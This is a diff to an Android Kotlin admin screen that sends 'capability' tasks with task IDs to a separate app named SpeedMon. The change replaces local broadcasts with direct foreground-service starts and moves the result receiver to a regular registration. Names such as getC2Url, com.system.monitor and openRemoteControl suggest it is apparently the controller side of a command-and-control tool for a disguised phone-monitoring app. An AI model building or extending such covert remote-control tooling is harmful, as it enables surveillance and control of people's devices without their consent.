@@ -116,10 +116,11 @@ class AdminActivity : AppCompatActivity() {
         val filter = IntentFilter("com.system.monitor.ACTION_RESULT")
         LocalBroadcastManager.getInstance(this).registerReceiver(resultReceiver!!, filter)
 
-        // SpeedMon local result receiver
+        // SpeedMon result receiver - use regular broadcast receiver (cross-app)
         speedMonResultReceiver = SpeedMonResultReceiver()
         val speedMonFilter = IntentFilter("com.speedmon.ACTION_RESULT")
-        LocalBroadcastManager.getInstance(this).registerReceiver(speedMonResultReceiver!!, speedMonFilter)
+        // Register as regular broadcast receiver for cross-app communication
+        registerReceiver(speedMonResultReceiver!!, speedMonFilter, Context.RECEIVER_NOT_EXPORTED)
     }
 
     private fun getC2Url(): String {
@@ -197,25 +198,43 @@ class AdminActivity : AppCompatActivity() {
 
     private fun sendLocalTask(capability: String, args: Map<String, Any>) {
         val taskId = java.util.UUID.randomUUID().toString()
-        val intent = Intent("com.speedmon.ACTION_COMMAND").apply {
+        val serviceIntent = Intent().apply {
+            setClassName("com.speedmon", "com.speedmon.SpeedMonService")
+            action = "com.speedmon.ACTION_COMMAND"
             putExtra("capability", capability)
             putExtra("args", gson.toJson(args))
             putExtra("task_id", taskId)
-            setPackage("com.speedmon")
         }
-        LocalBroadcastManager.getInstance(this).sendBroadcast(intent)
-        Toast.makeText(this, "Task sent to SpeedMon: $capability", Toast.LENGTH_SHORT).show()
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(serviceIntent)
+            } else {
+                startService(serviceIntent)
+            }
+            Toast.makeText(this, "Task sent to SpeedMon: $capability", Toast.LENGTH_SHORT).show()
+        } catch (e: Exception) {
+            Toast.makeText(this, "Failed to send: ${e.message}", Toast.LENGTH_SHORT).show()
+        }
     }
 
     private fun testLocalConnection() {
-        val intent = Intent("com.speedmon.ACTION_COMMAND").apply {
+        val serviceIntent = Intent().apply {
+            setClassName("com.speedmon", "com.speedmon.SpeedMonService")
+            action = "com.speedmon.ACTION_COMMAND"
             putExtra("capability", "apps")
             putExtra("args", "{}")
             putExtra("task_id", "test-${System.currentTimeMillis()}")
-            setPackage("com.speedmon")
         }
-        LocalBroadcastManager.getInstance(this).sendBroadcast(intent)
-        Toast.makeText(this, "Test command sent to SpeedMon", Toast.LENGTH_SHORT).show()
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(serviceIntent)
+            } else {
+                startService(serviceIntent)
+            }
+            Toast.makeText(this, "Test command sent to SpeedMon", Toast.LENGTH_SHORT).show()
+        } catch (e: Exception) {
+            Toast.makeText(this, "Failed to send: ${e.message}", Toast.LENGTH_SHORT).show()
+        }
     }
 
     private fun openRemoteControl() {
